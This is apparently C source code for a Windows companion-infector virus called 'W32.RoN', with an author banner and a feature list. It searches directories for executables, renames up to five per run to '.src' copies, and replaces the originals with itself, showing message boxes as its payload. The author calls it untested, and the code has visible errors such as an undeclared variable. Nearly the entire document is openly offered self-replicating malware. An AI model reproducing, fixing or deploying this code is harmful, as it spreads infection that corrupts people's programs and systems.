//	=======================W32.RoN==========================
//	|	RoN[Reborn of Nippy]			     |
//	|						     |
// 	|	Author:	Moaphie/F-13 LABS			     |
//	|	Email:	prommas_6@hotmail.com	
	|	 http://moaphie.awardspace.com    |
//	=========================================================
//	===============
//	|Virus Description|
//	==========================================================
//	| - using companion technique	       			       |
//	| - infect 5 files per run					       |
//	| - Cross-Directory infection				       |
//	==========================================================
//
//	special thanks to a zine(sorry...i forgot the name of that zine^_^) for the companion technique
//
//
//	i know this is a lame virii 
//	anyhow i made this for the experience and some other reasons and this is not tested ! so there are some bugs.
//
//
//	for any comments please send them to my email but not the shits please!
//
//----------------------------------------------------------------FILE BEGINS-------------------------------------------------------------------------------------




#include<windows.h>
#pragma comment (lib,"user32")
#pragma comment (lib,"shell32")

char virname[MAX_PATH];
char hostname[MAX_PATH];
char companion[MAX_PATH];
HINSTANCE kernel;
FARPROC FileOpen,FileRead,FileWrite,FileClose,SetPointer;
WIN32_FIND_DATA fdata;


int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{

	
	HANDLE hfile;
	int fcount=1,no_more_files=1;

	GetModuleFileName(NULL,virname,sizeof(virname));

	kernel=LoadLibrary("kernel32.dll");
	FileOpen=GetProcAddress(kernel,"CreateFileA");
	FileRead=GetProcAddress(kernel,"ReadFile");
	FileWrite=GetProcAddress(kernel,"WriteFile");
	FileClose=GetProcAddress(kernel,"CloseHandle");
	SetPointer=GetProcAddress(kernel,"SetFilePointer");

	strcpy(companion,virname);
	strcat(companion,".src");

	WinExec(companion,NULL);

	payload();			
	hfile=FindFirstFile("*.*",&fdata);
	while((no_more_files!=0) && (fcount!=5)){

			no_more_files=FindNextFile(hfile,&fdata);

			if(FindExecutable(fdata.cFileName,0,hostname)>32){

			if(isinfected(hostname)==FALSE){
				
				infect_file(hostname);  

				fcount+=1;	
			}
			}	
	}


}

BOOL isinfected(LPSTR host){
char buff[MAX_PATH];

strcpy(buff,host);
strcat(buff,".src");

if(FindFirstFile(buff,&fdata)==INVALID_HANDLE_VALUE)
	return FALSE;
else
	return TRUE;

}


int infect_file(LPSTR host){
char syshost[MAX_PATH];

strcpy(syshost,host);
strcat(syshost,".src");

CopyFile(host,srchost,NULL);
CopyFile(virname,host,NULL);

return 0x0;
}

int payload(){
	MessageBox(NULL,"no data destroyed....im a peace-lover person!","RoN",MB_OK);
	MessageBox(NULL,"Author: Moaphie\nprommas_6[-at-]hotmail.com","RoN",MB_OK); 
	
}
//---------------------------------------------------------------------END OF FILE-------------------------------------------------------------------------------------